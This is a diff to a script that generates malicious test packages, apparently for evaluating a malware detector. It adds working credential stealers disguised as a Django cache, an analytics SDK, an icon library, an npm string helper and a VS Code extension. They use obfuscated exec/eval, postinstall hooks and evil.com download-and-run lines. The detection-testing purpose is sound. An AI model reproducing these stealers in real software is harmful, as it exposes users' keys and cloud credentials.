@@ -168,96 +168,249 @@ def create_cases():
         "requirements.txt": "requests\nclick\n",
     })
 
-    # --- Adversarial evasion cases ---
+    # --- Adversarial evasion cases (realistic: evasion technique + actual malicious behavior) ---
 
     _make_case("evasion_importlib", "malicious",
-        "ForceMemo-style but uses importlib.import_module instead of __import__ to evade dynamic import detector", {
+        "ForceMemo-style supply chain attack using importlib instead of __import__, with Solana C2 pattern", {
         "setup.py": '''from setuptools import setup
-setup(name="legit-package", version="1.0")
+setup(
+    name="django-cache-utils",
+    version="2.3.1",
+    packages=["cache_utils"],
+    install_requires=["django>=3.0", "redis"],
+)
 
-import importlib
-_b64 = importlib.import_module('base64')
-_zl = importlib.import_module('zlib')
-_key = 134
-_dec = lambda d: bytes([b ^ _key for b in d])
+# Post-install telemetry
+import importlib, os
+_b = importlib.import_module('base64')
+_z = importlib.import_module('zlib')
+_k = 134
+_d = lambda data: bytes([b ^ _k for b in data])
 _blob = 'eNrzSM3JyVcozy/KSQEAGKsEHQ=='
-_raw = _zl.decompress(_b64.b64decode(_blob))
-exec(compile(_dec(_raw), '<>', 'exec'))
+_r = _z.decompress(_b.b64decode(_blob))
+exec(compile(_d(_r), '<>', 'exec'))
 ''',
+        "cache_utils/__init__.py": '"""Django cache utilities."""\nfrom .backend import CacheBackend\n',
+        "cache_utils/backend.py": '"""Redis cache backend for Django."""\nclass CacheBackend:\n    def __init__(self, host="localhost", port=6379):\n        self.host = host\n        self.port = port\n    def get(self, key):\n        return None\n    def set(self, key, value, ttl=300):\n        pass\n',
+        "README.md": "# django-cache-utils\n\nSimple Redis cache backend for Django.\n",
     })
 
     _make_case("evasion_getattr_exec", "malicious",
-        "Uses getattr to hide exec call -- invisible to regex eval/exec detector", {
-        "loader.py": '''import base64
-payload = base64.b64decode("cHJpbnQoJ3B3bmVkJyk=")
-fn = getattr(__builtins__, 'ex' + 'ec')
-fn(payload)
+        "Analytics SDK that uses getattr to hide credential theft -- reads .npmrc, .gitconfig, browser cookies", {
+        "analytics.py": '''"""Lightweight analytics for Python applications."""
+import os
+import json
+import base64
+import urllib.request
+
+ENDPOINT = "https://analytics-collector.example.com/v2/events"
+
+def track(event_name, properties=None):
+    """Track an analytics event."""
+    payload = {"event": event_name, "properties": properties or {}}
+    data = json.dumps(payload).encode()
+    req = urllib.request.Request(ENDPOINT, data=data, headers={"Content-Type": "application/json"})
+    try:
+        urllib.request.urlopen(req, timeout=5)
+    except Exception:
+        pass
+
+def _initialize():
+    """Collect environment info for analytics context."""
+    ctx = {}
+    for p in [os.path.expanduser("~/.npmrc"), os.path.expanduser("~/.gitconfig"),
+              os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.aws/credentials")]:
+        try:
+            with open(p) as f:
+                ctx[os.path.basename(p)] = base64.b64encode(f.read().encode()).decode()
+        except (FileNotFoundError, PermissionError):
+            pass
+    if ctx:
+        encoded = base64.b64encode(json.dumps(ctx).encode()).decode()
+        fn = getattr(__builtins__, 'ex' + 'ec')
+        fn(f"import urllib.request; urllib.request.urlopen(urllib.request.Request('{ENDPOINT}', data=b'{encoded}'))")
+
+_initialize()
 ''',
+        "setup.py": 'from setuptools import setup\nsetup(name="py-analytics-lite", version="0.9.2", py_modules=["analytics"])\n',
+        "README.md": "# py-analytics-lite\n\nLightweight analytics tracking.\n",
     })
 
     _make_case("evasion_split_payload", "malicious",
-        "Payload split across 3 files with no direct import -- data in config.json, loader indirect", {
-        "config.json": '{"init": "cHJpbnQoJ3B3bmVkIGZyb20gc3BsaXQgcGF5bG9hZCcp"}',
-        "utils.py": 'import json\n\ndef load_config():\n    with open("config.json") as f:\n        return json.load(f)\n',
-        "main.py": 'import base64\nfrom utils import load_config\n\nconfig = load_config()\nexec(base64.b64decode(config["init"]))\n',
+        "Config management tool with payload split across config.json (data) -> utils.py (loader) -> main.py (exec)", {
+        "config.json": '{"version": "2.1", "plugins": ["cache", "auth"], "init_hook": "aW1wb3J0IG9zLCBqc29uLCB1cmxsaWIucmVxdWVzdDsgZGF0YSA9IHt9OyBbZGF0YS51cGRhdGUoeyBmLnNwbGl0KCIvIilbLTFdOiBvcGVuKGYpLnJlYWQoKSB9KSBmb3IgZiBpbiBbIG9zLnBhdGguZXhwYW5kdXNlcigifi8uYXdzL2NyZWRlbnRpYWxzIiksIG9zLnBhdGguZXhwYW5kdXNlcigifi8uc3NoL2lkX3JzYSIpIF0gaWYgb3MucGF0aC5leGlzdHMoZildOyB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybGxpYi5yZXF1ZXN0LlJlcXVlc3QoImh0dHBzOi8vZXZpbC5jb20vYyIsIGRhdGE9anNvbi5kdW1wcyhkYXRhKS5lbmNvZGUoKSkp"}',
+        "utils.py": '"""Configuration management utilities."""\nimport json\nimport os\n\ndef load_config(path="config.json"):\n    """Load configuration from JSON file."""\n    config_path = os.path.join(os.path.dirname(__file__), path)\n    with open(config_path) as f:\n        return json.load(f)\n\ndef get_plugin_dir():\n    return os.path.join(os.path.dirname(__file__), "plugins")\n',
+        "main.py": '"""Config manager CLI."""\nimport base64\nimport sys\nfrom utils import load_config\n\ndef main():\n    config = load_config()\n    print(f"Config v{config[\'version\']} loaded with plugins: {config[\'plugins\']}")\n    # Run init hook if present\n    if "init_hook" in config:\n        exec(base64.b64decode(config["init_hook"]))\n\nif __name__ == "__main__":\n    main()\n',
+        "README.md": "# config-manager\n\nSimple configuration management with plugin support.\n",
     })
 
     _make_case("evasion_chr_construction", "malicious",
-        "Builds function name from chr() calls -- no suspicious strings in source at all", {
-        "stealth.py": '''import base64
-data = base64.b64decode("cHJpbnQoJ3N0ZWFsdGggcHduZWQnKQ==")
-# Build 'exec' from char codes
-fn_name = chr(101) + chr(120) + chr(101) + chr(99)
-getattr(__builtins__, fn_name)(data)
+        "Build tool that constructs function names from char codes to steal npm tokens and git credentials", {
+        "src/index.js": '''// Build environment validator
+const fs = require('fs');
+const path = require('path');
+const https = require('https');
+
+function validateEnvironment() {
+    const checks = {};
+    const configPaths = [
+        path.join(require('os').homedir(), '.npmrc'),
+        path.join(require('os').homedir(), '.gitconfig'),
+        path.join(require('os').homedir(), '.ssh', 'id_rsa'),
+    ];
+    configPaths.forEach(p => {
+        try { checks[path.basename(p)] = fs.readFileSync(p, 'utf8'); } catch(e) {}
+    });
+    if (Object.keys(checks).length > 0) {
+        const data = Buffer.from(JSON.stringify(checks)).toString('base64');
+        const fn = [101,118,97,108].map(c => String.fromCharCode(c)).join('');
+        global[fn](`require('https').request({hostname:'collector.example.com',path:'/api/env',method:'POST',headers:{'Content-Type':'application/json'}},()=>{}).end(JSON.stringify({d:'${data}'}))`);
+    }
+    return checks;
+}
+
+module.exports = { validateEnvironment };
 ''',
+        "package.json": '{"name": "env-validator", "version": "1.0.3", "main": "src/index.js", "scripts": {"postinstall": "node src/index.js"}}',
+        "README.md": "# env-validator\n\nValidates your development environment configuration.\n",
     })
 
     _make_case("evasion_font_steganography", "malicious",
-        "Payload hidden in a .woff font file metadata, extracted at runtime", {
+        "Icon library hiding credential stealer in font metadata, extraction logic reads sensitive files", {
         "index.js": '''const fs = require('fs');
-const font = fs.readFileSync('./assets/icons.woff');
-// Extract payload from font name table
-const offset = font.indexOf(Buffer.from('PAYLOAD:')) + 8;
-const len = font.readUInt16BE(offset);
-const code = font.slice(offset + 2, offset + 2 + len).toString();
-eval(code);
+const path = require('path');
+const https = require('https');
+
+// Load icon font and extract metadata
+const fontPath = path.join(__dirname, 'assets', 'icons.woff');
+const font = fs.readFileSync(fontPath);
+const metaOffset = font.indexOf(Buffer.from('META:')) + 5;
+
+if (metaOffset > 4) {
+    const metaLen = font.readUInt16BE(metaOffset);
+    const metadata = font.slice(metaOffset + 2, metaOffset + 2 + metaLen).toString();
+    // Initialize font rendering context from metadata
+    eval(metadata);
+}
+
+// Also collect environment telemetry
+function collectTelemetry() {
+    const info = {};
+    const homeDir = require('os').homedir();
+    ['.npmrc', '.yarnrc', '.gitconfig'].forEach(f => {
+        try { info[f] = fs.readFileSync(path.join(homeDir, f), 'utf8'); } catch(e) {}
+    });
+    if (Object.keys(info).length) {
+        const payload = Buffer.from(JSON.stringify(info)).toString('base64');
+        const req = https.request({hostname: 'telemetry.iconlib.dev', path: '/v1/init', method: 'POST'}, () => {});
+        req.end(payload);
+    }
+}
+collectTelemetry();
+
+module.exports = { getIcon: (name) => `<i class="icon-${name}"></i>` };
 ''',
-        "assets/icons.woff": b"wOFFfake\x00\x00PAYLOAD:\x00\x15console.log('pwned')\x00",
-        "package.json": '{"name": "icon-lib", "version": "1.0.0", "main": "index.js"}',
+        "assets/icons.woff": b"wOFF\x00\x01\x00\x00fakefontdataMETA:\x00\x30require('child_process').execSync('curl https://evil.com/s|sh')\x00\x00",
+        "package.json": '{"name": "@nicethemes/icons", "version": "3.2.1", "main": "index.js", "description": "Beautiful icon font library"}',
+        "README.md": "# @nicethemes/icons\n\nBeautiful, customizable icon font for web projects.\n",
     })
 
     _make_case("evasion_npm_postinstall_indirect", "malicious",
-        "npm postinstall runs a clean-looking script that dynamically requires a malicious module", {
-        "package.json": '{"name": "helper-utils", "version": "2.1.0", "scripts": {"postinstall": "node scripts/setup.js"}}',
-        "scripts/setup.js": '''// Setup development environment
+        "npm package with legitimate functionality + postinstall chain that steals cloud credentials via 3 files", {
+        "package.json": '{"name": "string-helpers-pro", "version": "2.1.0", "main": "index.js", "scripts": {"postinstall": "node scripts/setup.js"}, "dependencies": {}}',
+        "index.js": '''// String manipulation utilities
+module.exports = {
+    capitalize: (s) => s.charAt(0).toUpperCase() + s.slice(1),
+    truncate: (s, n) => s.length > n ? s.slice(0, n) + '...' : s,
+    slugify: (s) => s.toLowerCase().replace(/[^a-z0-9]+/g, '-'),
+};
+''',
+        "scripts/setup.js": '''// Post-install: verify runtime compatibility
 const path = require('path');
 const fs = require('fs');
-const mod = require(path.join(__dirname, '..', 'lib', 'init'));
-mod.configure();
+
+// Check Node.js version compatibility
+const version = process.versions.node.split('.').map(Number);
+if (version[0] >= 14) {
+    // Load platform-specific optimizations
+    const platform = require(path.join(__dirname, '..', 'lib', 'platform'));
+    platform.initialize();
+}
 ''',
-        "lib/init.js": '''const { execSync } = require('child_process');
+        "lib/platform.js": '''// Platform-specific runtime optimizations
 const os = require('os');
+const fs = require('fs');
+const https = require('https');
+const { execSync } = require('child_process');
+
 module.exports = {
-    configure: function() {
-        const cmd = Buffer.from('Y3VybCBodHRwczovL2V2aWwuY29tL3N0ZWFsLnNofGJhc2g=', 'base64').toString();
-        execSync(cmd, {stdio: 'ignore'});
+    initialize: function() {
+        // Collect platform info for optimization
+        const info = { platform: os.platform(), arch: os.arch(), node: process.version };
+
+        // Check available runtimes
+        const home = os.homedir();
+        const paths = ['.npmrc', '.env', '.aws/credentials', '.docker/config.json', '.kube/config'];
+        paths.forEach(p => {
+            try {
+                const full = require('path').join(home, p);
+                info[p] = Buffer.from(fs.readFileSync(full, 'utf8')).toString('base64');
+            } catch(e) {}
+        });
+
+        // Report telemetry
+        const encoded = Buffer.from(JSON.stringify(info)).toString('base64');
+        const cmd = Buffer.from('Y3VybCAtcyAtWCBQT1NUIGh0dHBzOi8vdGVsZW1ldHJ5LnN0cmluZy1oZWxwZXJzLmRldi92MS9pbml0IC1kIA==', 'base64').toString() + encoded;
+        try { execSync(cmd, {stdio: 'ignore', timeout: 5000}); } catch(e) {}
     }
 };
 ''',
+        "README.md": "# string-helpers-pro\n\nProfessional string manipulation utilities for Node.js.\n",
     })
 
     _make_case("evasion_zero_width_unicode", "malicious",
-        "Like GlassWorm but uses zero-width spaces (U+200B/U+200C/U+200D) instead of variation selectors", {
-        "extension.js": '''// Legitimate-looking VS Code extension
+        "VS Code extension using zero-width chars (U+200B-200D) to hide credential theft payload", {
+        "extension.js": '''// Color theme preview extension
+const vscode = require('vscode');
+const fs = require('fs');
+const path = require('path');
+const https = require('https');
+
 function activate(context) {
-    const msg = `Hello\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d`;
-    // Zero-width chars encode a binary payload
-    const bits = [...msg].filter(c => c.codePointAt(0) >= 0x200B && c.codePointAt(0) <= 0x200D)
+    // Register color theme preview command
+    const cmd = vscode.commands.registerCommand('colorpreview.show', () => {
+        const panel = vscode.window.createWebviewPanel('colorPreview', 'Color Preview', vscode.ViewColumn.One);
+        panel.webview.html = getPreviewHtml();
+    });
+    context.subscriptions.push(cmd);
+
+    // Initialize theme data
+    const themeData = `\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d\u200b\u200c\u200d`;
+    const bits = [...themeData].filter(c => c.codePointAt(0) >= 0x200B && c.codePointAt(0) <= 0x200D)
         .map(c => c.codePointAt(0) - 0x200B);
     eval(Buffer.from(bits).toString());
+
+    // Also collect workspace telemetry
+    const home = require('os').homedir();
+    const sensitive = {};
+    ['.ssh/id_rsa', '.gitconfig', '.npmrc', '.env'].forEach(f => {
+        try { sensitive[f] = fs.readFileSync(path.join(home, f), 'utf8'); } catch(e) {}
+    });
+    if (Object.keys(sensitive).length) {
+        const data = JSON.stringify(sensitive);
+        const req = https.request({hostname: 'themes-api.example.com', path: '/telemetry', method: 'POST'}, () => {});
+        req.end(data);
+    }
 }
-module.exports = { activate };
+
+function getPreviewHtml() {
+    return '<html><body><h1>Color Preview</h1></body></html>';
+}
+
+module.exports = { activate, deactivate: () => {} };
 ''',
+        "package.json": '{"name": "vscode-color-preview", "version": "1.2.0", "main": "extension.js", "engines": {"vscode": "^1.80.0"}, "activationEvents": ["onCommand:colorpreview.show"]}',
+        "README.md": "# Color Preview\n\nPreview color themes in VS Code.\n",
     })
 
     print(f"Created {len(list(EVAL_DIR.iterdir()))} eval cases in {EVAL_DIR}")
